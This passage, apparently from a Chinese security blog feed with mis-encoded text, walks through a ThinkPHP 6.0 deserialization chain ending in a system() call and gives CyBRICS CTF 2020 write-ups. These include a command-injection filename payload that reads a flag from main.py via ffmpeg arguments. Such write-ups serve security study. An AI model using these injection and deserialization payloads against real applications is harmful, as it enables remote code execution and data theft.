srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é¦–å…ˆ6.0ç‰ˆæœ¬çš„ä¸»è¦é—®é¢˜æ˜¯å‰é¢5.*ç‰ˆæœ¬çš„åˆ©ç”¨èµ·ç‚¹Windowsç±»éƒ½æ²¡äº†ã€‚ä¹Ÿå°±æ˜¯å°‘äº†ä¸€ä¸ª<code>__destruct()</code>ã€‚é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ›¿ä»£çš„<code>__destruct</code>ä½œä¸ºèµ·ç‚¹ã€‚å¹¶ä¸”æœ€å¥½å®ƒèƒ½å¤Ÿåœ¨ä¸­é—´æŸä¸ªç¯èŠ‚èµ·åˆ°ä¸å…¶ä»–é“¾å­ç›¸åŒä½œç”¨æ¯”å¦‚è§¦å‘<code>__call</code>,<code>__toString</code>ä¹‹ç±»çš„ã€‚è¿™æ ·çš„é€»è¾‘ä¹Ÿæ˜¯ç¬¬5ç©ºé—´laravelé‚£é¢˜çš„è§£é¢˜æ€è·¯å§ã€‚å› ä¸ºè·Ÿè¿‡é“¾å­çš„äººéƒ½çŸ¥é“åªéœ€è¦ä¸¤ä¸ªç±»å°±èƒ½rce.æ—¢ç„¶å…¶ä¸­ä¸€ä¸ªdestructè¢«å¤„ç†äº†ã€‚æ‰¾ä¸€ä¸ªæ›¿ä»£çš„è‡ªç„¶æ˜¯æœ€ç®€å•çš„åŠæ³•ã€‚</p><p>vendor/topthink/think-orm/src/Model.php</p><pre><code class="php">public function __destruct(){    if ($this-&gt;lazySave) {        $this-&gt;save();    }}</code></pre><p>æ„é€ lazySaveä¸ºçœŸå€¼ã€‚è¿›å…¥saveå‡½æ•°</p><pre><code class="php">public function save(array $data = [], string $sequence = null): bool{    // æ•°æ®å¯¹è±¡èµ‹å€¼    $this-&gt;setAttrs($data);    if ($this-&gt;isEmpty() || false === $this-&gt;trigger(&#39;BeforeWrite&#39;)) {        return false;    }    $result = $this-&gt;exists ? $this-&gt;updateData() : $this-&gt;insertData($sequence);    if (false === $result) {        return false;    }    // å†™å…¥å›è°ƒ    $this-&gt;trigger(&#39;AfterWrite&#39;);    // é‡æ–°è®°å½•åŸå§‹æ•°æ®    $this-&gt;origin   = $this-&gt;data;    $this-&gt;set      = [];    $this-&gt;lazySave = false;    return true;}</code></pre><p>è¿™é‡Œå…³é”®å‡½æ•°æ˜¯<code>updateData</code>.ä¸è¿‡æ—¢ç„¶å¦‚æ­¤æˆ‘ä»¬ä¸èƒ½è¿›å…¥ä¸Šé¢é‚£ä¸ªifåˆ†æ”¯ã€‚<br>isEmptyä¸trigger</p><pre><code class="php">public function isEmpty(): bool{    return empty($this-&gt;data);}protected function trigger(string $event): bool{    if (!$this-&gt;withEvent) {        return true;    }    ......</code></pre><p>æ˜¾ç„¶ã€‚éœ€è¦<br>1.<code>$this-&gt;data</code>ä¸ºéç©ºæ•°ç»„ã€‚<br>2.<code>$this-&gt;withEvent</code>ä¸ºfalse<br>3.<code>$this-&gt;exists</code>ä¸ºtrueè¿›å…¥updateDataå‡½æ•°</p><p>è·Ÿè¿›åˆ°updateDataåã€‚æˆ‘ä»¬ä¸å¦¨å…ˆçœ‹ä¸‹å“ªä¸€ä¸ªå‡½æ•°å¯ä»¥åˆ©ç”¨,å†å›å¤´è€ƒè™‘å‚æ•°çš„æ„é€ ã€‚è¿™é‡Œé¡ºç€çœ‹åˆ°checkAllowFieldså</p><p><img src="/2020/08/05/Thinkphp-vuln/26.PNG" class="lazyload" data-srcset="26.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><pre><code class="php">$table = $this-&gt;table ? $this-&gt;table . $this-&gt;suffix : $query-&gt;getTable();</code></pre><p>å­˜åœ¨å¯æ§å˜é‡çš„æ‹¼æ¥ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è§¦å‘<code>__toString</code>äº†ã€‚åœ¨ç»å†äº†å‰é¢å‡ ä¸ªç‰ˆæœ¬çš„ååºåˆ—åŒ–æ„é€ åï¼Œæˆ‘ä»¬å½“ç„¶æ¸…æ¥štp5.1~5.2ç‰ˆæœ¬çš„é“¾å­åˆ†åˆ«æ˜¯<code>__destruct()=&gt; __toString() =&gt; __call() =&gt; call_user_func_array / $closure($value,$this-&gt;data)</code>çš„ä¸€ç³»åˆ—è°ƒç”¨ã€‚é‚£ä¹ˆæ­¤å¤„æˆ‘ä»¬è‡ªç„¶å¯ä»¥ç»§ç»­è¾¾æˆ__toStringæ¥å»¶ç»­é“¾å­ã€‚</p><p>å›å¤´å†æ£€æŸ¥updateDataè¿™çš„å‚æ•°éœ€è¦ã€‚é¦–å…ˆç¬¬ä¸€ä¸ªtriggeræˆ‘ä»¬å·²ç»æ»¡è¶³æ¡ä»¶äº†ã€‚ç„¶å<code>if (empty($data))</code>è¿™ä¸ªåˆ†æ”¯ä¸èƒ½è¿›å…¥ã€‚é‚£å°±è¦çœ‹å‘getChangedData</p><pre><code class="php">public function getChangedData(): array{    $data = $this-&gt;force ? $this-&gt;data : array_udiff_assoc($this-&gt;data, $this-&gt;origin, function ($a, $b) {        if ((empty($a) || empty($b)) &amp;&amp; $a !== $b) {            return 1;        }        return is_object($a) || $a != $b ? 1 : 0;    });    // åªè¯»å­—æ®µä¸å…è®¸æ›´æ–°    foreach ($this-&gt;readonly as $key =&gt; $field) {        if (isset($data[$field])) {            unset($data[$field]);        }    }    return $data;}</code></pre><p>ä»¤<code>$this-&gt;force</code>ä¸ºtrue.ç„¶ådataå°±å¯æ§äº†ã€‚</p><p>æ¥ä¸‹æ¥æ˜¯å›åˆ°åˆ©ç”¨å‡½æ•°checkAllowFields.æ‹¼æ¥å¤„ä¹‹å‰çš„ä»£ç </p><pre><code class="php">if (empty($this-&gt;field)) {    if (!empty($this-&gt;schema)) {        $this-&gt;field = array_keys(array_merge($this-&gt;schema, $this-&gt;jsonType));    } else {        $query = $this-&gt;db();</code></pre><p>éœ€è¦<br>1.<code>$this-&gt;field</code>ä¸ºç©ºè¿›å…¥åˆ†æ”¯<br>2.<code>$this-&gt;schema</code>ä¸ºç©ºè¿›å…¥else</p><p>çœ‹ä¸€çœ¼db()</p><pre><code class="php">public function db($scope = []): Query{    /** @var Query $query */    $query = self::$db-&gt;connect($this-&gt;connection)        -&gt;name($this-&gt;name . $this-&gt;suffix)        -&gt;pk($this-&gt;pk);</code></pre><p>åŸæ¥db()å‡½æ•°è¿™é‡Œä¹Ÿæœ‰ä¸€ä¸ªå˜é‡æ‹¼æ¥â€¦â€¦ä¸è¿‡æ®Šé€”åŒå½’ã€‚æˆ‘ä»¬ç”¨å“ªä¸€ä¸ªéƒ½å·®ä¸å¤šã€‚ä¾‹å¦‚expä¸­é“¾å­æ˜¯æŠŠ<code>$this-&gt;suffix</code>ä½œä¸ºè§¦å‘çš„å¯¹è±¡çš„ã€‚</p><p>ç„¶ååé¢å°±æ˜¯ä¸€è·¯ç•…é€šäº†ã€‚è¿™é‡Œè·Ÿ5.1(æ³¨æ„ä¸æ˜¯5.0,5.0 çš„ toStringç”¨çš„æ˜¯modelç±»çš„)ä¸€æ ·ç”¨çš„æ˜¯Conversionç±»é‡Œçš„<code>__toString() =&gt; toJson =&gt; toArray =&gt; getAttr =&gt; getValue()</code></p><p>æˆ‘ä»¬ä¸»è¦åœ¨getAttr,getValueé‡Œæ„é€ </p><pre><code class="php">public function getAttr(string $name){    try {        $relation = false;        $value    = $this-&gt;getData($name);    } catch (InvalidArgumentException $e) {        $relation = $this-&gt;isRelationAttr($name);        $value    = null;    }    return $this-&gt;getValue($name, $value, $relation);}public function getData(string $name = null)//$name=&#39;wh1t3p1g&#39;{    if (is_null($name)) {        return $this-&gt;data;    }    $fieldName = $this-&gt;getRealFieldName($name);    if (array_key_exists($fieldName, $this-&gt;data)) {//$this-&gt;data = array(&quot;wh1t3p1g&quot;=&gt;&quot;whoami&quot;);        return $this-&gt;data[$fieldName];//è¿”å›&#39;whoami&#39;ï¼Œå›åˆ°getAttr    } elseif (array_key_exists($fieldName, $this-&gt;relation)) {        return $this-&gt;relation[$fieldName];    }protected function getValue(string $name, $value, bool $relation = false){                 //$name=&#39;wh1t3p1g&#39; $value=â€˜lsâ€™ $relation=false    // æ£€æµ‹å±æ€§è·å–å™¨    $fieldName = $this-&gt;getRealFieldName($name);  //è¯¥å‡½æ•°é»˜è®¤è¿”å›$name=&#39;wh1t3p1g&#39;=$fieldName     $method    = &#39;get&#39; . App::parseName($name, 1) . &#39;Attr&#39;;  //æ‹¼æ¥å­—ç¬¦ï¼šgetlinAttr    if (isset($this-&gt;withAttr[$fieldName])) { //[&#39;wh1t3p1g&#39;=&gt;&#39;system&#39;]        if ($relation) { //$relation=false            $value = $this-&gt;getRelationValue($name);        }        $closure = $this-&gt;withAttr[$fieldName]; //$closure=&#39;system&#39;        $value   = $closure($value, $this-&gt;data);//system(&#39;whoami&#39;,$this-&gt;data    }    .......    return $value;}</code></pre><p>è‡³æ­¤å®Œæˆæ•´æ¡åˆ©ç”¨é“¾ã€‚æ³¨æ„å®ƒçš„è°ƒç”¨æ–¹æ³•æ˜¯<code>system(&quot;whoami&quot;, [&quot;wh1t3p1g&quot;=&gt;&quot;whoami&quot;])</code>.è¿™æ˜¯ä¸€ç§åˆæ³•è°ƒç”¨ã€‚</p><p>å°ç»“ä¸‹ã€‚tpæ‰€æœ‰ç³»åˆ—ååºåˆ—åŒ–é“¾å°±è¿™ä¹ˆå¤šäº†ã€‚å¤§ä½“ä¸Šæ€è·¯éƒ½æ˜¯ä¸€æ ·çš„ã€‚åªæœ‰5.0ç‰ˆæœ¬æ˜¯è¾ƒä¸ºå¤æ‚çš„å†™æ–‡ä»¶ã€‚å…¶ä»–ç‰ˆæœ¬éƒ½å¯ä»¥ç›´æ¥rce.é­”æœ¯æ–¹æ³•ä¹ŸåŸºæœ¬éƒ½æ˜¯<code>destructï¼ŒtoString,call</code>è°ƒç”¨ã€‚å…¶ä¸­5.2,6.0æ˜¯æ²¡æœ‰callçš„å¿…è¦çš„ã€‚</p><h2 id="tp6-0ä»»æ„æ–‡ä»¶å†™"><a href="#tp6-0ä»»æ„æ–‡ä»¶å†™" class="headerlink" title="tp6.0ä»»æ„æ–‡ä»¶å†™"></a>tp6.0ä»»æ„æ–‡ä»¶å†™</h2><p>è¿™ä¸ªæ´å…¶å®æ²¡å¿…è¦è·Ÿäº†ã€‚å°±æ˜¯å¹´åichunqiuæˆ˜ç–«æ¯”èµ›æ—¶å‡ºç°è¿‡çš„æ´ã€‚sessionå¯ä»¥æ›´æ”¹æˆ32ä½<code>.php</code>åç¼€ã€‚ç„¶åå¦‚æœsessionå†…å®¹å¯æ§çš„è¯å°±ç›¸å½“äºå†™äº†shell.è¿™ä¸ªè¿˜æ˜¯æ¯”è¾ƒå¸¸è§çš„ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æ²¡æƒ³åˆ°çœŸçš„è¿˜æ˜¯æŠŠè¿™ä¸ªé¡¹ç›®çš„å†…å®¹éƒ½è·Ÿå®Œäº†ã€‚ä¸å¾—ä¸è¯´ç†è§£äº†ä¸€äº›åŸç†åä¹Ÿå°±å¯¹tpç³»åˆ—payloadçš„æ„é€ æœ‰äº†æ›´æ·±çš„ç†è§£ã€‚è™½ç„¶å¤§éƒ¨åˆ†å®æˆ˜ä¸­é»‘ç›’åŸºæœ¬æµ‹ä¸å‡ºæ¥å°±æ˜¯äº†ã€‚</p><p>ä¸‹ä¸€æ­¥åœ¨è€ƒè™‘æ˜¯å»çœ‹çœ‹laravelè¿˜æ˜¯javaçš„å‡ ä¸ªååºåˆ—åŒ–é“¾å­ã€‚åŠ æ²¹å§</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CyBRICS-CTF 2020</title>
      <link href="2020/07/26/CyBRICS-CTF-2020/"/>
      <url>2020/07/26/CyBRICS-CTF-2020/</url>
      
        <content type="html"><![CDATA[<p>Cybricsæ¯”èµ›æ„Ÿè§‰éƒ½æ²¡é˜Ÿå‹åœ¨æ‰“â€¦â€¦ç®€å•è®°å½•ä¸‹åšçš„å‡ é“é¢˜</p><a id="more"></a><h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>ç­¾åˆ°ä¸è°ˆã€‚<br><img src="/2020/07/26/CyBRICS-CTF-2020/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>é¦–å…ˆæ˜¯æºç å®¡è®¡.</p><pre><code class="python">import loggingimport reimport subprocessimport uuidfrom pathlib import Pathfrom flask import Flask, render_template, request, redirect, url_for, flash, send_from_directoryfrom flask_bootstrap import Bootstrapimport osfrom werkzeug.utils import secure_filenameimport filetypeALLOWED_EXTENSIONS = {&#39;gif&#39;}app = Flask(__name__)app.config[&#39;UPLOAD_FOLDER&#39;] = &#39;./uploads&#39;app.config[&#39;SECRET_KEY&#39;] = &#39;********************************&#39;app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 500 * 1024  # 500KbffLaG = &quot;cybrics{********************************}&quot;Bootstrap(app)logging.getLogger().setLevel(logging.DEBUG)def allowed_file(filename):    return &#39;.&#39; in filename and filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])def upload_file():    logging.debug(request.headers)    if request.method == &#39;POST&#39;:        if &#39;file&#39; not in request.files:            logging.debug(&#39;No file part&#39;)            flash(&#39;No file part&#39;, &#39;danger&#39;)            return redirect(request.url)        file = request.files[&#39;file&#39;]        if file.filename == &#39;&#39;:            logging.debug(&#39;No selected file&#39;)            flash(&#39;No selected file&#39;, &#39;danger&#39;)            return redirect(request.url)        if not allowed_file(file.filename):            logging.debug(f&#39;Invalid file extension of file: {file.filename}&#39;)            flash(&#39;Invalid file extension&#39;, &#39;danger&#39;)            return redirect(request.url)        if file.content_type != &quot;image/gif&quot;:            logging.debug(f&#39;Invalid Content type: {file.content_type}&#39;)            flash(&#39;Content type is not &quot;image/gif&quot;&#39;, &#39;danger&#39;)            return redirect(request.url)        if not bool(re.match(&quot;^[a-zA-Z0-9_\-. &#39;\&quot;\=\$\(\)\|]*$&quot;, file.filename)) or &quot;..&quot; in file.filename:            logging.debug(f&#39;Invalid symbols in filename: {file.content_type}&#39;)            flash(&#39;Invalid filename&#39;, &#39;danger&#39;)            return redirect(request.url)        if file and allowed_file(file.filename):            filename = secure_filename(file.filename)            file.save(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], file.filename))            mime_type = filetype.guess_mime(f&#39;uploads/{file.filename}&#39;)            if mime_type != &quot;image/gif&quot;:                logging.debug(f&#39;Invalid Mime type: {mime_type}&#39;)                flash(&#39;Mime type is not &quot;image/gif&quot;&#39;, &#39;danger&#39;)                return redirect(request.url)            uid = str(uuid.uuid4())            os.mkdir(f&quot;uploads/{uid}&quot;)            logging.debug(f&quot;Created: {uid}. Command: ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\&quot;&quot;)            command = subprocess.Popen(f&quot;ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\&quot;&quot;, shell=True)            command.wait(timeout=15)            logging.debug(command.stdout)            flash(&#39;Successfully saved&#39;, &#39;success&#39;)            return redirect(url_for(&#39;result&#39;, uid=uid))    return render_template(&quot;form.html&quot;)@app.route(&#39;/result/&lt;uid&gt;/&#39;)def result(uid):    images = []    for image in os.listdir(f&quot;uploads/{uid}&quot;):        mime_type = filetype.guess(str(Path(&quot;uploads&quot;) / uid / image))        if image.endswith(&quot;.png&quot;) and mime_type is not None and mime_type.EXTENSION == &quot;png&quot;:            images.append(image)    return render_template(&quot;result.html&quot;, uid=uid, images=images)@app.route(&#39;/uploads/&lt;uid&gt;/&lt;image&gt;&#39;)def image(uid, image):    logging.debug(request.headers)    dir = str(Path(app.config[&#39;UPLOAD_FOLDER&#39;]) / uid)    print(dir)    return send_from_directory(dir, image)@app.errorhandler(413)def request_entity_too_large(error):    return &quot;File is too large&quot;, 413if __name__ == &quot;__main__&quot;:    app.run(host=&#39;localhost&#39;, port=5000, debug=False, threaded=True)</code></pre><p>æ³¨æ„åˆ°æ‰§è¡Œffmpegæœ‰ä¸ªå˜é‡æ‹¼æ¥ã€‚æˆ‘ä»¬çš„file.filenameå¯æ§ã€‚ä¸è¿‡éœ€è¦ç»è¿‡å‰é¢å‡ å±‚æ£€éªŒã€‚ç®€å•çœ‹å¯ä»¥å‘ç°ä¸€æ–¹é¢é™åˆ¶äº†<br>åç¼€ï¼ˆå–æœ€åä¸€ä¸ª. åå­—ç¬¦æ£€æµ‹æ˜¯å¦ä¸ºgifï¼‰å¦å¤–é™åˆ¶äº†å¯ç”¨å­—ç¬¦ã€‚ä¸è¿‡è¿™äº›å­—ç¬¦å·²ç»å¤Ÿç”¨äº†ã€‚</p><p>é¦–å…ˆæˆ‘çš„æ€è·¯æ˜¯å»æ‰¾ffmpegçš„å¯ç”¨flag.é€šè¿‡<code>-h</code>åˆ—å‡ºä¸€äº›flagåã€‚æˆ‘æ³¨æ„åˆ°è¿™æ ·å‡ ä¸ª</p><pre><code class="bash">-report             generate a report-filter_script filename  read stream filtergraph description from a file-metadata string=string  add metadata</code></pre><p>è¿™é‡Œæˆ‘ä¸»è¦æ˜¯å¯»æ‰¾è·Ÿæ–‡ä»¶æœ‰å…³çš„é€‰é¡¹ã€‚å…¶ä¸­reportä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ªlogæ–‡ä»¶ã€‚filter_scriptå¯ä»¥è¯»å–ä¸€ä¸ªæ–‡ä»¶å†…å®¹ä½œä¸ºstream filter. -metadata å¯ä»¥æ·»åŠ ä¸€ç»„é”®å€¼ã€‚åŠ å…¥åˆ°è¾“å‡ºçš„metadataä¸­ã€‚</p><p>ä¸è¿‡æœ¬åœ°è·‘èµ·æ¥ç®€å•å°è¯•ä¸‹åã€‚ä¼šå‘ç°å› ä¸ºæˆ‘ä»¬ä¸å¯ç”¨<code>/</code>å­—ç¬¦ã€‚æ‰€ä»¥æƒ³è¦æ§åˆ¶è·¯å¾„æ˜¯åšä¸åˆ°çš„ã€‚æˆ‘ä»¬å¿…é¡»è¦è®©åŒ…å«flagçš„ä¿¡æ¯è¾“å‡ºåˆ°uploadsçš„æ²™ç›’ä¸‹ã€‚è€Œæ³¨æ„åˆ°é¢˜ç›®<code>/uploads/{uid}/</code>ä¸‹çš„å†…å®¹å¹¶æ²¡æœ‰åƒå…¶ä»–ä¸¤ä¸ªè·¯ç”±é‚£æ ·åšæ–‡ä»¶ç±»å‹æ£€æŸ¥ã€‚æ‰€ä»¥æˆ‘ä»¬æ˜¯å¯ä»¥ç›´æ¥è®¿é—®çš„ã€‚</p><p>å› æ­¤<code>-report</code>æ— æ³•ä½¿ç”¨ã€‚å› ä¸ºå®ƒåªèƒ½åœ¨å½“å‰ç›®å½•ç”ŸæˆæŠ¥å‘Šã€‚è€Œ<code>-filter_script</code>å‡å¦‚æ­é…<code>-report</code>å€’æ˜¯å¯ä»¥æŠŠè¯»å–æ–‡ä»¶å†…å®¹æ—¶çš„é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°æ—¥å¿—ä¸­ã€‚ä½†æ˜¯å› ä¸ºæ—¥å¿—è¯»ä¸äº†æ‰€ä»¥ä¹Ÿä¸å¯è¡Œã€‚</p><p>äºæ˜¯æˆ‘å…³æ³¨ç‚¹å°±é›†ä¸­åˆ°äº†<code>-metadata</code>ä¸Šã€‚æˆ‘ä»¬å¯ä»¥æ„é€ è¿™æ ·çš„å‘½ä»¤é—­åˆå¼•å·å¹¶ä¸”æ‰§è¡Œã€‚</p><pre><code class="bash">ffmpeg -i &#39;uploads/logo.gif&#39; -metadata language=$(cat main.py| grep ffLaG |base64)  -metadata abc=&#39;.gif&#39; &quot;uploads/{uid}/%03d.png&quot;</code></pre><p>ä»è¾“å‡ºç»“æœä¸Šçœ‹æ˜¯æˆåŠŸæ‰§è¡Œå‘½ä»¤äº†çš„ã€‚ä½†æ˜¯æœ¬åœ°æµ‹è¯•å‘ç°ä¸€ä¸ªé—®é¢˜ã€‚è¾“å‡ºçš„pngè¯»ä¸åˆ°å…¶metadataå±æ€§ã€‚</p><p>ç®€å•çš„æŸ¥é˜…äº†ä¸‹æ–‡æ¡£ä»¥åŠè°·æ­Œåæˆ‘æ¨æµ‹åº”è¯¥æ˜¯å› ä¸ºffmpegçš„metadataé€‰é¡¹ä¸æ”¯æŒpng.ä¸è¿‡æ–‡æ¡£é‡Œæˆ‘å‘ç°è§†é¢‘æ–‡ä»¶æ˜¯è‚¯å®šå¯ä»¥ä¿®æ”¹å¢åŠ metadataçš„ã€‚å› æ­¤å½“æˆ‘å°è¯•å°†ä¸Šé¢çš„å‘½ä»¤æ”¹ä¸ºè¾“å‡ºæˆaviåã€‚æ˜¯å¯ä»¥é€šè¿‡exiftoolè¯»å–åˆ°metadataä¸­çš„languageçš„ã€‚<br><img src="/2020/07/26/CyBRICS-CTF-2020/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‚£ä¹ˆæˆ‘ä»¬ç°åœ¨åªéœ€è¦ä¸€ä¸ªå¼ºè¿«è½¬æ¢è¾“å‡ºç±»å‹çš„flag. å†æ¬¡æŸ¥æ–‡æ¡£å‘ç°äº†<code>-f fmt              force format</code>ã€‚<br>æ‰€ä»¥æœ€ç»ˆpayloadå¦‚ä¸‹ã€‚æˆ‘ä»¬åªéœ€åœ¨ä¼ å¥½logo.gifåä¼ gifæ–‡ä»¶å¹¶ä»¥å¦‚ä¸‹ä½œä¸ºæ–‡ä»¶å</p><pre><code class="bash">logo.gif&#39; -metadata language=$(cat main.py| grep ffLaG |base64) -f avi  -metadata abc=&#39;.gif</code></pre><p>é¦–å…ˆæˆ‘ä»¬ä¿è¯äº†ç»“å°¾æœ€åçš„<code>.</code>æœ«å°¾æ˜¯<code>gif</code>ç»•è¿‡åç¼€æ£€æŸ¥ã€‚ä¹‹åæ‰§è¡Œå‘½ä»¤æ—¶å°†ä¼šæŠŠmain.pyä¸­çš„ffLaGå˜é‡å€¼ä¿å­˜åˆ°è¾“å‡ºçš„language metadataä¸­ã€‚æœ¬åœ°è·‘èµ·æ¥çš„è¯ã€‚ä¼šå‘ç°åœ¨æ²™ç›’ä¸‹æœ€ç»ˆç”Ÿæˆäº†åä¸º<code>%03d.png</code>çš„aviç±»å‹æ–‡ä»¶ã€‚å¹¶ä¸”å¯ä»¥ç”¨exiftoolè·å–åˆ°å…¶metadataã€‚</p><p>æœ¬åœ°æ‰“é€šçš„è¯å»è¿œç¨‹æ‰“è‚¯å®šå°±æ²¡é—®é¢˜äº†ã€‚è¿™é‡Œæ‰“è¿œç¨‹æ—¶ç¨å¾®å¤šå‘äº†å‡ æ¬¡åŒ…ã€‚æœ€ç»ˆè·å–åˆ°å›¾ç‰‡å¹¶å¾—åˆ°flag<br><img src="/2020/07/26/CyBRICS-CTF-2020/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>çœ‹ç€è¿™ä¸ªflagæˆ‘é«˜åº¦æ€€ç–‘è‡ªå·±ä¸æ˜¯é¢„æœŸåšçš„â€¦â€¦æä¸å¥½å¯ä»¥å¾ˆç®€å•è§£å†³æ‰ã€‚</p><p>ps:<br>ä½›äº†ã€‚ä¸ä¼šå°±æˆ‘å»çœ‹ffmpegçš„flagsäº†å§â€¦â€¦è™½ç„¶åšæ³•å¾ˆæœ‰è¶£ä½†æ˜¯æœªå…å¤ªå‚»äº†â€¦â€¦åˆ«äººçš„payload:<br><code>&#39;$(cp main.py uploads$(pwd | cut -c1)GENERATED_UID$(pwd | cut -c1))&#39;.gif</code><br>wtcltclã€‚å¿˜è®°ç”¨pwdæ‹¼æ¥ç›®å½•äº†ã€‚bash scriptéƒ½ç™½å†™äº†ã€‚</p><h2 id="woc"><a href="#woc" class="headerlink" title="woc"></a>woc</h2><p>è¿™é“é¢˜ç›®æœ€ä¸»è¦çš„å°±æ˜¯ç”¨ä»£ç æ··æ·†è§†çº¿ã€‚æ‰€ä»¥å…³é”®åœ¨äºä¸€å®šè¦æ‰¾åˆ°çœŸæ­£å¯ä»¥åˆ©ç”¨çš„æ¼æ´ä»£ç ã€‚<br>é¦–å…ˆæ³¨æ„åˆ°ä¸€ä¸ªä¼¼ä¹å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ã€‚åœ¨calc.php</p><pre><code class="php">&lt;?phpif (!@$_SESSION[&#39;userid&#39;]) {    redir(&quot;.&quot;);} elseif (!@$_GET[&#39;template&#39;]) {    redir(&quot;.&quot;);}$userid = $_SESSION[&#39;userid&#39;];$template = $_GET[&#39;template&#39;];if (!preg_match(&#39;#^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$#s&#39;, $template)) {    redir(&quot;.&quot;);}if (!is_file(&quot;calcs/$userid/templates/$template.html&quot;)) {    redir(&quot;.&quot;);}if (trim(@$_POST[&#39;field&#39;])) {    $field = trim($_POST[&#39;field&#39;]);    if (!preg_match(&#39;#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s&#39;, $field)) {        $value = &quot;BAD&quot;;    } else {        if (@$_POST[&#39;share&#39;]) {            $calc = uuid();            file_put_contents(&quot;calcs/$userid/$calc.php&quot;, &quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n&quot; . file_get_contents(&quot;inc/calclib.html&quot;) . file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;));            redir(&quot;?p=sharelink&amp;calc=$calc&quot;);        } else {            try {                $value = eval(&quot;return $field;&quot;);            } catch (Throwable $e) {                $value = null;            }            if (!is_numeric($value) &amp;&amp; !is_string($value)) {                $value = &quot;ERROR&quot;;            } else {                $value = (string)$value;            }        }    }    echo &quot;&lt;script&gt;var preloadValue = &quot; . json_encode($value) . &quot;;&lt;/script&gt;&quot;;}require &quot;inc/calclib.html&quot;;require &quot;calcs/$userid/templates/$template.html&quot;;</code></pre><p>ç¬¬ä¸€æƒ³æ³•è‚¯å®šæ˜¯åˆ©ç”¨é‚£ä¸ªeval.ä¸è¿‡è¿™é‡Œå­—ç¬¦å®åœ¨æ˜¯å¤ªé™åˆ¶äº†ã€‚æˆ‘å¾ˆå¿«å°±å‘ç°æ ¹æœ¬æ— æ³•æ„é€ å‡º<code>INF</code>,<code>NAN</code>ä»¥å¤–ç­‰ç­‰å­—ç¬¦å¹¶å–å•ã€‚å› æ­¤å¾—å°è¯•å˜åŒ–æ€è·¯ã€‚</p><p>æ³¨æ„åˆ°é¢˜ç›®åŠŸèƒ½ã€‚æ•´ä½“ä¸Šæä¾›äº†ä¸€ä¸ªå‡æ³¨å†Œç™»å½•åŠŸèƒ½ç”¨æ¥è®°å½•session.åŒæ—¶å…è®¸æˆ‘ä»¬ä¸Šä¼ æ–°template.æˆ‘ä»¬å¯ä»¥æ ¹æ®calc.phpä¸­æ‰€ä¼ templateå‚æ•°é€‰æ‹©templateã€‚å‰å¾€newtemplate.phpã€‚å‘ç°å…¶é™åˆ¶äº†æˆ‘ä»¬templateçš„ä»£ç ä¸­ä¸èƒ½å«æœ‰<code>&lt;?</code>ä¸”å¿…é¡»åŒ…å«å®ƒè¦æ±‚çš„idæ 